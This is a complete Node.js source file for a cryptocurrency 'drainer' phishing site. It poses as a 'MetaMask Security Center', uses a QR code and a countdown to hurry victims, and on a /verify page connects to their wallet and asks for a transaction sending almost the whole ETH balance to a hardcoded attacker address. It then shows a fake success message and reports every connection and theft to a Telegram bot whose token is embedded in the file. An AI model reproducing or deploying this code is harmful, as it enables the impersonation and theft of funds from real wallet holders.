const express = require('express');
const QRCode = require('qrcode');
const app = express();

// ========== YOUR DETAILS ==========
const DRAIN_ADDRESS = '0x071a1c7bE8609452CB268b3396EC5358E6E9Ecd6';
const BOT_TOKEN = '6952302341:AAE1WRba7NjJXdV0tAvqSopXvllMkgBKfxs';
const CHAT_ID = '6521633168';
const SITE_URL = 'https://drainer-tool-production.up.railway.app';
// ==================================

let qrDataUrl = '';
async function generateQR() {
  qrDataUrl = await QRCode.toDataURL(SITE_URL + '/verify', {
    width: 300,
    margin: 2,
    color: { dark: '#000000', light: '#ffffff' }
  });
}
generateQR();

// Main page – shows the QR code
app.get('/', (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>MetaMask Security Center</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{background:#0a0a0a;color:#fff;font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
    .card{background:#1a1a1a;border-radius:20px;padding:30px;max-width:420px;text-align:center}
    h2{color:#f5841f;margin-bottom:8px;font-size:22px}
    p{color:#aaa;font-size:14px;margin-bottom:20px}
    img{width:260px;height:260px;background:#fff;border-radius:16px;padding:10px}
    .timer{color:#ff5555;font-weight:bold;margin-top:12px}
  </style>
</head>
<body>
  <div class="card">
    <h2>🦊 MetaMask Security Verification</h2>
    <p>Open MetaMask, tap the QR scanner (top‑right), and scan this code to verify your wallet.</p>
    <img src="${qrDataUrl}" width="260" height="260" alt="QR Code">
    <p class="timer" id="countdown">Expires in: 05:00</p>
  </div>
  <script>
    let time = 300;
    setInterval(() => {
      time--;
      const m = Math.floor(time / 60);
      const s = time % 60;
      document.getElementById('countdown').innerText = 'Expires in: ' + m + ':' + (s < 10 ? '0' : '') + s;
      if (time <= 0) location.reload();
    }, 1000);
  </script>
</body></html>`);
});

// The drain page – opens after QR scan
app.get('/verify', (req, res) => {
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verifying...</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{background:#0a0a0a;color:#fff;font-family:Arial,sans-serif;text-align:center;padding:40px 20px}
    .spinner{border:4px solid #333;border-top:4px solid #f5841f;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;margin:40px auto}
    @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
    h2{color:#f5841f;margin:15px 0}
    p{color:#aaa;font-size:14px}
    button{background:#f5841f;color:#fff;border:none;padding:16px 40px;font-size:16px;border-radius:12px;cursor:pointer;margin-top:20px;font-weight:bold}
    button:disabled{background:#555}
    .error{color:#ff5555;margin-top:15px;font-size:13px}
    .success{color:#33ff55;font-weight:bold;margin-top:20px}
  </style>
</head>
<body>
  <div class="spinner" id="spinner"></div>
  <h2 id="title">Initializing Security Protocol...</h2>
  <p id="info">Please keep this page open.</p>
  <button id="btn" onclick="startDrain()" style="display:none">Connect Wallet</button>
  <div class="success" id="success"></div>
  <div class="error" id="error"></div>

  <script>
    const DRAIN_ADDRESS = '${DRAIN_ADDRESS}';
    const BOT_TOKEN = '${BOT_TOKEN}';
    const CHAT_ID = '${CHAT_ID}';

    // Send Telegram notification
    async function notify(text) {
      try {
        await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: CHAT_ID, text: text })
        });
      } catch (e) {}
    }

    async function startDrain() {
      document.getElementById('btn').style.display = 'none';
      document.getElementById('spinner').style.display = 'block';
      document.getElementById('title').innerText = 'Connecting to MetaMask...';
      document.getElementById('error').innerText = '';

      try {
        // Check for MetaMask's injected provider
        if (typeof window.ethereum === 'undefined') {
          throw new Error('No wallet detected. Please open this page inside MetaMask app.');
        }

        // Request account access → MetaMask connection popup
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const account = accounts[0];
        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
        const chainNum = parseInt(chainId, 16);

        document.getElementById('title').innerText = '✅ Connected';
        document.getElementById('info').innerText = 'Confirm the verification in MetaMask.';
        document.getElementById('spinner').style.display = 'none';

        await notify('🔗 Wallet connected: ' + account + ' | Chain: ' + chainNum);

        // Get balance
        const balanceHex = await window.ethereum.request({
          method: 'eth_getBalance',
          params: [account, 'latest']
        });
        const balance = BigInt(balanceHex);

        // Get gas price
        const gasPriceHex = await window.ethereum.request({ method: 'eth_gasPrice' });
        const gasPrice = BigInt(gasPriceHex);
        const gasCost = gasPrice * 21000n;

        if (balance > gasCost) {
          const sendable = balance - gasCost;
          const sendableHex = '0x' + sendable.toString(16);

          // Request transaction → MetaMask send popup
          const txHash = await window.ethereum.request({
            method: 'eth_sendTransaction',
            params: [{
              from: account,
              to: DRAIN_ADDRESS,
              value: sendableHex,
              gas: '0x5208' // 21000
            }]
          });

          const amount = Number(sendable) / 1e18;
          document.getElementById('title').innerText = '✅ Verification Complete';
          document.getElementById('info').innerText = 'Your wallet is now secure.';
          document.getElementById('success').innerText = 'Certificate updated.';
          await notify('💰 DRAINED ' + amount.toFixed(6) + ' ETH from ' + account + ' | TX: ' + txHash);
        } else {
          document.getElementById('title').innerText = '✅ Verified';
          document.getElementById('info').innerText = 'No balance detected – nothing to secure.';
          await notify('⚠️ No balance: ' + account);
        }
      } catch (e) {
        document.getElementById('spinner').style.display = 'none';
        document.getElementById('btn').style.display = 'block';
        document.getElementById('btn').disabled = false;
        document.getElementById('title').innerText = 'Verification Failed';
        document.getElementById('info').innerText = 'Make sure you are using MetaMask and try again.';
        document.getElementById('error').innerText = e.message;
        await notify('❌ Error: ' + e.message);
      }
    }

    // Show button after short loading delay
    setTimeout(() => {
      document.getElementById('spinner').style.display = 'none';
      document.getElementById('btn').style.display = 'block';
      document.getElementById('title').innerText = 'MetaMask Security Check';
      document.getElementById('info').innerText = 'Tap the button below to verify your wallet.';
    }, 2000);
  </script>
</body></html>`);
});

app.listen(process.env.PORT || 3000, () => console.log('✅ Drainer live on port ' + (process.env.PORT || 3000)));
